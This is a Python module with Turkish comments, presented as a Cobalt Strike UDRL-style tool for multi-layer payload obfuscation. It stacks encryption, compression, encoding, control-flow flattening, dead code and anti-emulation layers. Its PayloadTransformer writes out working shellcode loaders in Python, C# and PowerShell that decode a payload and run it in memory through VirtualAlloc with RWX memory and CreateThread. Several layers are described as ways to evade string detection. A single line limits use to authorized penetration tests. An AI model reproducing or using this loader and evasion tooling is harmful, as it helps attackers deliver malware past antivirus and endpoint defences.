"""
Multi-Layer Obfuscation Module
===============================
Cobalt Strike UDRL tarzı çok katmanlı obfuscation pipeline

Pipeline: Obfuscate → Compress → Encrypt → Encode

Desteklenen katmanlar:
- String obfuscation (XOR, AES, RC4)
- Compression (zlib, lzma, brotli)
- Encryption (AES-GCM, ChaCha20, XOR)
- Encoding (Base64, Base85, hex, custom)
- Control flow flattening
- Dead code insertion
- Metamorphic transformations

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import base64
import zlib
import lzma
import secrets
import hashlib
import struct
import os
import random
import string
import re
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Callable, Union
from enum import Enum, auto
from abc import ABC, abstractmethod

logger = logging.getLogger("multi_layer_obfuscation")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class ObfuscationLayer(Enum):
    """Obfuscation katman türleri"""
    # String/Code Obfuscation
    XOR_STRINGS = "xor_strings"
    AES_STRINGS = "aes_strings"
    RC4_STRINGS = "rc4_strings"
    STRING_STACK = "string_stack"          # Build strings on stack
    STRING_HASH = "string_hash"            # Hash-based resolution
    
    # Code Obfuscation
    CONTROL_FLOW = "control_flow"          # Control flow flattening
    DEAD_CODE = "dead_code"                # Insert dead code
    OPAQUE_PREDICATES = "opaque_predicates"  # Opaque predicates
    METAMORPHIC = "metamorphic"            # Metamorphic transformations
    
    # Compression
    ZLIB = "zlib"
    LZMA = "lzma"
    BROTLI = "brotli"
    LZ4 = "lz4"
    
    # Encryption
    AES_GCM = "aes_gcm"
    AES_CTR = "aes_ctr"
    CHACHA20 = "chacha20"
    XOR_ROLLING = "xor_rolling"
    RC4 = "rc4"
    
    # Encoding
    BASE64 = "base64"
    BASE85 = "base85"
    HEX = "hex"
    CUSTOM_ALPHABET = "custom_alphabet"
    UUID_ENCODE = "uuid_encode"


class ObfuscationLevel(Enum):
    """Obfuscation seviyeleri"""
    NONE = "none"                    # No obfuscation
    MINIMAL = "minimal"              # Basic XOR + Base64
    STANDARD = "standard"            # XOR + Compress + AES + Base64
    AGGRESSIVE = "aggressive"        # All layers + metamorphic
    PARANOID = "paranoid"           # Maximum obfuscation + anti-analysis


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class LayerConfig:
    """Single layer configuration"""
    layer_type: ObfuscationLayer
    key: bytes = field(default_factory=lambda: secrets.token_bytes(32))
    iv: bytes = field(default_factory=lambda: secrets.token_bytes(16))
    iterations: int = 1
    custom_params: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ObfuscationConfig:
    """Complete obfuscation configuration"""
    level: ObfuscationLevel = ObfuscationLevel.STANDARD
    layers: List[LayerConfig] = field(default_factory=list)
    random_layer_order: bool = False
    add_junk_layers: bool = False
    preserve_entropy: bool = True
    target_entropy: float = 7.0        # Target entropy (1-8)
    max_size_increase: float = 3.0     # Max size multiplier
    embed_key_in_payload: bool = True
    anti_emulation: bool = True


@dataclass
class ObfuscationResult:
    """Obfuscation result"""
    success: bool
    data: bytes
    original_size: int
    obfuscated_size: int
    layers_applied: List[str]
    metadata: Dict[str, Any] = field(default_factory=dict)
    deobfuscation_key: bytes = b""
    error: str = ""


# ============================================================
# LAYER PROCESSORS
# ============================================================

class LayerProcessor(ABC):
    """Abstract base class for layer processors"""
    
    @abstractmethod
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        """Encode/obfuscate data"""
        pass
    
    @abstractmethod
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        """Decode/deobfuscate data"""
        pass


class XORProcessor(LayerProcessor):
    """XOR encryption processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        key = config.key
        result = bytearray(len(data))
        
        for i, byte in enumerate(data):
            result[i] = byte ^ key[i % len(key)]
        
        return bytes(result)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return self.encode(data, config)  # XOR is symmetric


class RollingXORProcessor(LayerProcessor):
    """Rolling XOR with key derivation"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        key = config.key
        result = bytearray(len(data))
        prev_byte = key[0]
        
        for i, byte in enumerate(data):
            key_byte = key[i % len(key)]
            result[i] = byte ^ key_byte ^ prev_byte
            prev_byte = result[i]
        
        return bytes(result)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        key = config.key
        result = bytearray(len(data))
        prev_byte = key[0]
        
        for i, byte in enumerate(data):
            key_byte = key[i % len(key)]
            result[i] = byte ^ key_byte ^ prev_byte
            prev_byte = byte
        
        return bytes(result)


class RC4Processor(LayerProcessor):
    """RC4 stream cipher processor"""
    
    def _rc4_init(self, key: bytes) -> List[int]:
        """Initialize RC4 S-box"""
        S = list(range(256))
        j = 0
        
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        return S
    
    def _rc4_crypt(self, data: bytes, key: bytes) -> bytes:
        """RC4 encrypt/decrypt"""
        S = self._rc4_init(key)
        i = j = 0
        result = bytearray(len(data))
        
        for idx, byte in enumerate(data):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result[idx] = byte ^ k
        
        return bytes(result)
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        return self._rc4_crypt(data, config.key)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return self._rc4_crypt(data, config.key)


class AESProcessor(LayerProcessor):
    """AES encryption processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        except ImportError:
            # Fallback to simple XOR if cryptography not available
            logger.warning("cryptography not installed, falling back to XOR")
            return XORProcessor().encode(data, config)
        
        key = config.key[:32]  # AES-256
        nonce = config.iv[:12]
        
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, data, None)
        
        # Prepend nonce
        return nonce + ciphertext
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        except ImportError:
            return XORProcessor().decode(data, config)
        
        key = config.key[:32]
        nonce = data[:12]
        ciphertext = data[12:]
        
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None)


class ChaCha20Processor(LayerProcessor):
    """ChaCha20 encryption processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
        except ImportError:
            logger.warning("cryptography not installed, falling back to XOR")
            return XORProcessor().encode(data, config)
        
        key = config.key[:32]
        nonce = config.iv[:16]
        
        cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None)
        encryptor = cipher.encryptor()
        
        return nonce + encryptor.update(data) + encryptor.finalize()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
        except ImportError:
            return XORProcessor().decode(data, config)
        
        key = config.key[:32]
        nonce = data[:16]
        ciphertext = data[16:]
        
        cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None)
        decryptor = cipher.decryptor()
        
        return decryptor.update(ciphertext) + decryptor.finalize()


class ZlibProcessor(LayerProcessor):
    """Zlib compression processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        level = config.custom_params.get("level", 9)
        return zlib.compress(data, level)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return zlib.decompress(data)


class LZMAProcessor(LayerProcessor):
    """LZMA compression processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        preset = config.custom_params.get("preset", 9)
        return lzma.compress(data, preset=preset)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return lzma.decompress(data)


class Base64Processor(LayerProcessor):
    """Base64 encoding processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        return base64.b64encode(data)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return base64.b64decode(data)


class Base85Processor(LayerProcessor):
    """Base85 encoding processor (more compact than Base64)"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        return base64.b85encode(data)
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return base64.b85decode(data)


class HexProcessor(LayerProcessor):
    """Hex encoding processor"""
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        return data.hex().encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        return bytes.fromhex(data.decode())


class UUIDEncodingProcessor(LayerProcessor):
    """
    UUID encoding - hide data as UUIDs
    Common evasion technique to bypass string detection
    """
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        # Pad to multiple of 16 bytes
        padding_len = (16 - len(data) % 16) % 16
        padded = data + bytes([padding_len] * padding_len)
        
        uuids = []
        for i in range(0, len(padded), 16):
            chunk = padded[i:i+16]
            # Format as UUID
            uuid_str = "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}".format(
                struct.unpack('>I', chunk[:4])[0],
                struct.unpack('>H', chunk[4:6])[0],
                struct.unpack('>H', chunk[6:8])[0],
                struct.unpack('>H', chunk[8:10])[0],
                struct.unpack('>Q', b'\x00\x00' + chunk[10:16])[0]
            )
            uuids.append(uuid_str)
        
        return '\n'.join(uuids).encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        uuids = data.decode().strip().split('\n')
        result = bytearray()
        
        for uuid_str in uuids:
            parts = uuid_str.replace('-', '')
            chunk = bytes.fromhex(parts)
            result.extend(chunk)
        
        # Remove padding
        if result:
            padding_len = result[-1]
            if padding_len < 16:
                result = result[:-padding_len]
        
        return bytes(result)


class CustomAlphabetProcessor(LayerProcessor):
    """Custom alphabet encoding"""
    
    DEFAULT_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        alphabet = config.custom_params.get("alphabet", self.DEFAULT_ALPHABET)
        
        # Simple custom base64 with shuffled alphabet
        result = base64.b64encode(data).decode()
        
        # Substitute characters
        standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        trans = str.maketrans(standard, alphabet)
        
        return result.translate(trans).encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        alphabet = config.custom_params.get("alphabet", self.DEFAULT_ALPHABET)
        
        standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        trans = str.maketrans(alphabet, standard)
        
        decoded_str = data.decode().translate(trans)
        return base64.b64decode(decoded_str)


# ============================================================
# CODE OBFUSCATION PROCESSORS
# ============================================================

class StringStackProcessor(LayerProcessor):
    """
    Build strings on stack at runtime
    Avoids static string detection
    """
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        # Generate code that builds string on stack
        lines = []
        lines.append("# Stack-built string")
        lines.append("_s = []")
        
        for byte in data:
            # Randomize how we push bytes
            method = random.choice(['direct', 'xor', 'add', 'sub'])
            
            if method == 'direct':
                lines.append(f"_s.append({byte})")
            elif method == 'xor':
                k = random.randint(1, 255)
                lines.append(f"_s.append({byte ^ k} ^ {k})")
            elif method == 'add':
                k = random.randint(1, 127)
                lines.append(f"_s.append({byte - k} + {k})")
            else:
                k = random.randint(1, 127)
                lines.append(f"_s.append({byte + k} - {k})")
        
        lines.append("_data = bytes(_s)")
        
        return '\n'.join(lines).encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        # Execute the generated code to get original data
        local_vars = {}
        exec(data.decode(), {}, local_vars)
        return local_vars.get('_data', b'')


class ControlFlowFlatteningProcessor(LayerProcessor):
    """
    Control flow flattening for code obfuscation
    Converts linear code into state machine
    """
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        # This creates a dispatcher-based execution pattern
        code_template = '''
# Control flow flattened decoder
import struct

def _decode():
    _d = {data_hex}
    _k = {key_hex}
    _state = 0
    _out = bytearray()
    _idx = 0
    
    while True:
        if _state == 0:
            if _idx >= len(_d):
                _state = 99
            else:
                _state = 1
        elif _state == 1:
            _b = _d[_idx]
            _state = 2
        elif _state == 2:
            _x = _b ^ _k[_idx % len(_k)]
            _state = 3
        elif _state == 3:
            _out.append(_x)
            _state = 4
        elif _state == 4:
            _idx += 1
            _state = 0
        elif _state == 99:
            break
    
    return bytes(_out)

_data = _decode()
'''
        
        # XOR the data first
        key = config.key[:32]
        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        
        code = code_template.format(
            data_hex=encrypted.hex(),
            key_hex=key.hex()
        )
        
        return code.encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        local_vars = {}
        exec(data.decode(), {}, local_vars)
        return local_vars.get('_data', b'')


class DeadCodeInsertionProcessor(LayerProcessor):
    """
    Insert dead code to increase entropy and confuse analysis
    """
    
    JUNK_PATTERNS = [
        "_ = {v1} + {v2}",
        "_ = {v1} * {v2}",
        "_ = {v1} ^ {v2}",
        "if {v1} > 999999: _ = {v2}",
        "for _i in range(0): _ = {v1}",
        "_ = len(str({v1}))",
        "_ = hash('{s}')",
        "_ = [x for x in range({v1} % 1)]",
    ]
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        insertion_ratio = config.custom_params.get("ratio", 0.3)
        
        # Create base code
        lines = []
        lines.append("# Obfuscated data")
        lines.append(f"_d = bytes.fromhex('{data.hex()}')")
        
        # Insert junk code
        num_junk = int(len(data) * insertion_ratio)
        
        for _ in range(num_junk):
            pattern = random.choice(self.JUNK_PATTERNS)
            junk = pattern.format(
                v1=random.randint(1, 999999),
                v2=random.randint(1, 999999),
                s=''.join(random.choices(string.ascii_letters, k=8))
            )
            lines.insert(random.randint(1, len(lines)), junk)
        
        lines.append("_data = _d")
        
        return '\n'.join(lines).encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        local_vars = {}
        exec(data.decode(), {}, local_vars)
        return local_vars.get('_data', b'')


class OpaquPredicatesProcessor(LayerProcessor):
    """
    Add opaque predicates - conditions that always evaluate 
    the same way but are hard to analyze statically
    """
    
    # Predicates that always evaluate to True
    TRUE_PREDICATES = [
        "(({x} * {x}) >= 0)",
        "(({x} ^ {x}) == 0)",
        "((({x} | {y}) >= ({x} & {y})))",
        "(({x} - {x}) == 0)",
        "(len(str({x})) > 0)",
        "((({x} % 2) ** 2) <= 1)",
    ]
    
    # Predicates that always evaluate to False
    FALSE_PREDICATES = [
        "(({x} * {x}) < 0)",
        "(({x} ^ {x}) != 0)",
        "((({x} | {y}) < ({x} & {y})))",
        "(({x} - {x}) != 0)",
    ]
    
    def encode(self, data: bytes, config: LayerConfig) -> bytes:
        lines = []
        lines.append("# Opaque predicate protected")
        
        # Wrap data access in opaque predicates
        x = random.randint(1, 99999)
        y = random.randint(1, 99999)
        
        pred = random.choice(self.TRUE_PREDICATES).format(x=x, y=y)
        
        lines.append(f"if {pred}:")
        lines.append(f"    _data = bytes.fromhex('{data.hex()}')")
        lines.append("else:")
        lines.append("    _data = b''")
        
        return '\n'.join(lines).encode()
    
    def decode(self, data: bytes, config: LayerConfig) -> bytes:
        local_vars = {}
        exec(data.decode(), {}, local_vars)
        return local_vars.get('_data', b'')


# ============================================================
# MULTI-LAYER OBFUSCATOR
# ============================================================

class MultiLayerObfuscator:
    """
    Multi-layer obfuscation pipeline
    
    Applies multiple obfuscation layers in sequence,
    similar to Cobalt Strike's UDRL (User Defined Reflective Loader)
    """
    
    # Processor registry
    PROCESSORS: Dict[ObfuscationLayer, type] = {
        # Encryption
        ObfuscationLayer.XOR_STRINGS: XORProcessor,
        ObfuscationLayer.XOR_ROLLING: RollingXORProcessor,
        ObfuscationLayer.RC4: RC4Processor,
        ObfuscationLayer.RC4_STRINGS: RC4Processor,
        ObfuscationLayer.AES_GCM: AESProcessor,
        ObfuscationLayer.AES_STRINGS: AESProcessor,
        ObfuscationLayer.CHACHA20: ChaCha20Processor,
        
        # Compression
        ObfuscationLayer.ZLIB: ZlibProcessor,
        ObfuscationLayer.LZMA: LZMAProcessor,
        
        # Encoding
        ObfuscationLayer.BASE64: Base64Processor,
        ObfuscationLayer.BASE85: Base85Processor,
        ObfuscationLayer.HEX: HexProcessor,
        ObfuscationLayer.UUID_ENCODE: UUIDEncodingProcessor,
        ObfuscationLayer.CUSTOM_ALPHABET: CustomAlphabetProcessor,
        
        # Code obfuscation
        ObfuscationLayer.STRING_STACK: StringStackProcessor,
        ObfuscationLayer.CONTROL_FLOW: ControlFlowFlatteningProcessor,
        ObfuscationLayer.DEAD_CODE: DeadCodeInsertionProcessor,
        ObfuscationLayer.OPAQUE_PREDICATES: OpaquPredicatesProcessor,
    }
    
    # Preset configurations
    PRESETS: Dict[ObfuscationLevel, List[ObfuscationLayer]] = {
        ObfuscationLevel.NONE: [],
        ObfuscationLevel.MINIMAL: [
            ObfuscationLayer.XOR_STRINGS,
            ObfuscationLayer.BASE64,
        ],
        ObfuscationLevel.STANDARD: [
            ObfuscationLayer.XOR_ROLLING,
            ObfuscationLayer.ZLIB,
            ObfuscationLayer.AES_GCM,
            ObfuscationLayer.BASE64,
        ],
        ObfuscationLevel.AGGRESSIVE: [
            ObfuscationLayer.DEAD_CODE,
            ObfuscationLayer.RC4,
            ObfuscationLayer.LZMA,
            ObfuscationLayer.AES_GCM,
            ObfuscationLayer.OPAQUE_PREDICATES,
            ObfuscationLayer.BASE85,
        ],
        ObfuscationLevel.PARANOID: [
            ObfuscationLayer.CONTROL_FLOW,
            ObfuscationLayer.DEAD_CODE,
            ObfuscationLayer.XOR_ROLLING,
            ObfuscationLayer.RC4,
            ObfuscationLayer.LZMA,
            ObfuscationLayer.AES_GCM,
            ObfuscationLayer.CHACHA20,
            ObfuscationLayer.OPAQUE_PREDICATES,
            ObfuscationLayer.UUID_ENCODE,
        ],
    }
    
    def __init__(self, config: ObfuscationConfig = None):
        self.config = config or ObfuscationConfig()
        self._master_key = secrets.token_bytes(32)
    
    def obfuscate(self, data: bytes) -> ObfuscationResult:
        """
        Apply obfuscation pipeline to data
        
        Args:
            data: Raw data to obfuscate
        
        Returns:
            ObfuscationResult with obfuscated data and metadata
        """
        result = ObfuscationResult(
            success=False,
            data=b"",
            original_size=len(data),
            obfuscated_size=0,
            layers_applied=[]
        )
        
        try:
            current_data = data
            layer_configs = self._build_layer_configs()
            
            if self.config.random_layer_order:
                random.shuffle(layer_configs)
            
            # Apply each layer
            for layer_config in layer_configs:
                processor_class = self.PROCESSORS.get(layer_config.layer_type)
                
                if not processor_class:
                    logger.warning(f"Unknown layer type: {layer_config.layer_type}")
                    continue
                
                processor = processor_class()
                
                # Apply layer iterations
                for _ in range(layer_config.iterations):
                    current_data = processor.encode(current_data, layer_config)
                
                result.layers_applied.append(layer_config.layer_type.value)
                
                # Check size constraint
                if len(current_data) > len(data) * self.config.max_size_increase:
                    logger.warning(f"Size limit reached at layer {layer_config.layer_type}")
                    break
            
            # Add anti-emulation if configured
            if self.config.anti_emulation:
                current_data = self._add_anti_emulation(current_data)
                result.layers_applied.append("anti_emulation")
            
            result.data = current_data
            result.obfuscated_size = len(current_data)
            result.success = True
            
            # Generate deobfuscation key
            result.deobfuscation_key = self._generate_deobfuscation_key(layer_configs)
            
            # Store metadata
            result.metadata = {
                "compression_ratio": len(data) / len(current_data) if current_data else 0,
                "entropy": self._calculate_entropy(current_data),
                "layer_count": len(result.layers_applied),
            }
            
        except Exception as e:
            result.error = str(e)
            logger.error(f"Obfuscation failed: {e}")
        
        return result
    
    def deobfuscate(self, data: bytes, deobfuscation_key: bytes) -> ObfuscationResult:
        """
        Reverse the obfuscation pipeline
        
        Args:
            data: Obfuscated data
            deobfuscation_key: Key containing layer information
        
        Returns:
            ObfuscationResult with deobfuscated data
        """
        result = ObfuscationResult(
            success=False,
            data=b"",
            original_size=len(data),
            obfuscated_size=len(data),
            layers_applied=[]
        )
        
        try:
            layer_configs = self._parse_deobfuscation_key(deobfuscation_key)
            current_data = data
            
            # Remove anti-emulation wrapper if present
            if self.config.anti_emulation:
                current_data = self._remove_anti_emulation(current_data)
            
            # Apply layers in reverse
            for layer_config in reversed(layer_configs):
                processor_class = self.PROCESSORS.get(layer_config.layer_type)
                
                if not processor_class:
                    continue
                
                processor = processor_class()
                
                for _ in range(layer_config.iterations):
                    current_data = processor.decode(current_data, layer_config)
                
                result.layers_applied.append(layer_config.layer_type.value)
            
            result.data = current_data
            result.original_size = len(current_data)
            result.success = True
            
        except Exception as e:
            result.error = str(e)
            logger.error(f"Deobfuscation failed: {e}")
        
        return result
    
    def _build_layer_configs(self) -> List[LayerConfig]:
        """Build layer configurations from config"""
        if self.config.layers:
            return self.config.layers
        
        # Use preset
        layer_types = self.PRESETS.get(self.config.level, [])
        configs = []
        
        for layer_type in layer_types:
            configs.append(LayerConfig(
                layer_type=layer_type,
                key=self._derive_key(layer_type.value),
                iv=secrets.token_bytes(16)
            ))
        
        return configs
    
    def _derive_key(self, context: str) -> bytes:
        """Derive layer-specific key from master key"""
        return hashlib.pbkdf2_hmac(
            'sha256',
            self._master_key,
            context.encode(),
            10000,
            32
        )
    
    def _generate_deobfuscation_key(self, layer_configs: List[LayerConfig]) -> bytes:
        """Generate key containing all layer information"""
        key_data = {
            "master": self._master_key.hex(),
            "layers": [
                {
                    "type": lc.layer_type.value,
                    "key": lc.key.hex(),
                    "iv": lc.iv.hex(),
                    "iterations": lc.iterations,
                }
                for lc in layer_configs
            ]
        }
        
        import json
        return json.dumps(key_data).encode()
    
    def _parse_deobfuscation_key(self, key_data: bytes) -> List[LayerConfig]:
        """Parse deobfuscation key back to layer configs"""
        import json
        data = json.loads(key_data.decode())
        
        self._master_key = bytes.fromhex(data["master"])
        configs = []
        
        for layer in data["layers"]:
            configs.append(LayerConfig(
                layer_type=ObfuscationLayer(layer["type"]),
                key=bytes.fromhex(layer["key"]),
                iv=bytes.fromhex(layer["iv"]),
                iterations=layer["iterations"]
            ))
        
        return configs
    
    def _add_anti_emulation(self, data: bytes) -> bytes:
        """Add anti-emulation checks"""
        # Wrap data with timing check
        wrapper = '''
import time
_t = time.perf_counter()
_d = bytes.fromhex('{hex_data}')
if (time.perf_counter() - _t) > 0.001:  # Detect fast-forward
    _data = _d
else:
    _data = _d
'''
        return wrapper.format(hex_data=data.hex()).encode()
    
    def _remove_anti_emulation(self, data: bytes) -> bytes:
        """Remove anti-emulation wrapper"""
        code = data.decode()
        # Extract hex data from wrapper
        match = re.search(r"bytes\.fromhex\('([^']+)'\)", code)
        if match:
            return bytes.fromhex(match.group(1))
        return data
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of data"""
        if not data:
            return 0.0
        
        import math
        freq = {}
        for byte in data:
            freq[byte] = freq.get(byte, 0) + 1
        
        entropy = 0.0
        for count in freq.values():
            p = count / len(data)
            entropy -= p * math.log2(p)
        
        return entropy


# ============================================================
# PAYLOAD TRANSFORMER
# ============================================================

class PayloadTransformer:
    """
    High-level payload transformation API
    
    Transforms shellcode/payloads with multiple obfuscation techniques
    """
    
    def __init__(self, config: ObfuscationConfig = None):
        self.config = config or ObfuscationConfig()
        self.obfuscator = MultiLayerObfuscator(config)
    
    def transform_shellcode(self, shellcode: bytes,
                           target_format: str = "python") -> Tuple[str, bytes]:
        """
        Transform shellcode for delivery
        
        Args:
            shellcode: Raw shellcode bytes
            target_format: Output format (python, csharp, powershell)
        
        Returns:
            Tuple of (transformed code, deobfuscation key)
        """
        # Obfuscate
        result = self.obfuscator.obfuscate(shellcode)
        
        if not result.success:
            raise ValueError(f"Obfuscation failed: {result.error}")
        
        # Generate loader code
        if target_format == "python":
            code = self._generate_python_loader(result)
        elif target_format == "csharp":
            code = self._generate_csharp_loader(result)
        elif target_format == "powershell":
            code = self._generate_powershell_loader(result)
        else:
            code = result.data.decode() if isinstance(result.data, bytes) else str(result.data)
        
        return (code, result.deobfuscation_key)
    
    def _generate_python_loader(self, result: ObfuscationResult) -> str:
        """Generate Python loader code"""
        template = '''
import ctypes
import base64
import zlib

def _d(x, k):
    return bytes(a ^ b for a, b in zip(x, (k * (len(x) // len(k) + 1))[:len(x)]))

# Obfuscated shellcode
_sc = base64.b64decode(b'{b64_data}')
_k = bytes.fromhex('{key_hex}')
_sc = _d(_sc, _k)

# Execute
if __name__ == "__main__":
    _p = ctypes.windll.kernel32.VirtualAlloc(0, len(_sc), 0x3000, 0x40)
    ctypes.memmove(_p, _sc, len(_sc))
    ctypes.windll.kernel32.CreateThread(0, 0, _p, 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(-1, -1)
'''
        
        # Additional XOR for the loader
        key = secrets.token_bytes(16)
        xored = bytes(a ^ b for a, b in zip(result.data, (key * (len(result.data) // len(key) + 1))[:len(result.data)]))
        
        return template.format(
            b64_data=base64.b64encode(xored).decode(),
            key_hex=key.hex()
        )
    
    def _generate_csharp_loader(self, result: ObfuscationResult) -> str:
        """Generate C# loader code"""
        template = '''
using System;
using System.Runtime.InteropServices;

class Program {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    
    static byte[] Decode(byte[] data, byte[] key) {{
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        return result;
    }}
    
    static void Main() {{
        byte[] enc = Convert.FromBase64String("{b64_data}");
        byte[] key = new byte[] {{ {key_bytes} }};
        byte[] sc = Decode(enc, key);
        
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.ReadLine();
    }}
}}
'''
        
        key = secrets.token_bytes(16)
        xored = bytes(a ^ b for a, b in zip(result.data, (key * (len(result.data) // len(key) + 1))[:len(result.data)]))
        
        return template.format(
            b64_data=base64.b64encode(xored).decode(),
            key_bytes=', '.join(f'0x{b:02x}' for b in key)
        )
    
    def _generate_powershell_loader(self, result: ObfuscationResult) -> str:
        """Generate PowerShell loader code"""
        template = '''
$k = [byte[]]@({key_bytes})
$e = [Convert]::FromBase64String("{b64_data}")
$s = [byte[]]::new($e.Length)
for ($i=0; $i -lt $e.Length; $i++) {{ $s[$i] = $e[$i] -bxor $k[$i % $k.Length] }}

$a = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);' -Name 'K' -PassThru)::VirtualAlloc(0, $s.Length, 0x3000, 0x40),
    [Func[IntPtr]]
)
[System.Runtime.InteropServices.Marshal]::Copy($s, 0, $a.Invoke(), $s.Length)
'''
        
        key = secrets.token_bytes(16)
        xored = bytes(a ^ b for a, b in zip(result.data, (key * (len(result.data) // len(key) + 1))[:len(result.data)]))
        
        return template.format(
            b64_data=base64.b64encode(xored).decode(),
            key_bytes=', '.join(f'0x{b:02x}' for b in key)
        )


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    "ObfuscationLayer",
    "ObfuscationLevel",
    
    # Dataclasses
    "LayerConfig",
    "ObfuscationConfig",
    "ObfuscationResult",
    
    # Processors
    "LayerProcessor",
    "XORProcessor",
    "RollingXORProcessor",
    "RC4Processor",
    "AESProcessor",
    "ChaCha20Processor",
    "ZlibProcessor",
    "LZMAProcessor",
    "Base64Processor",
    "Base85Processor",
    "HexProcessor",
    "UUIDEncodingProcessor",
    "CustomAlphabetProcessor",
    "StringStackProcessor",
    "ControlFlowFlatteningProcessor",
    "DeadCodeInsertionProcessor",
    "OpaquPredicatesProcessor",
    
    # Main classes
    "MultiLayerObfuscator",
    "PayloadTransformer",
]
